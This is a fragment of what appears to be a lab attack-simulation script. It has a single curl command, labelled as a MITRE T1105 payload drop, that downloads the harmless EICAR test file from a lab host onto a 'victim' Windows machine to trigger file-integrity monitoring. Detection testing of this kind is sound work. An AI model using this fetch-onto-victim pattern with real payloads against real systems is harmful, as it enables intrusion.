:: Stage 6 — Payload Drop (T1105), part 2/2
:: Host: Windows 11 victim — Terminal 2, executed over the SSH session
:: Downloads the EICAR file into the FIM-monitored folder.
curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
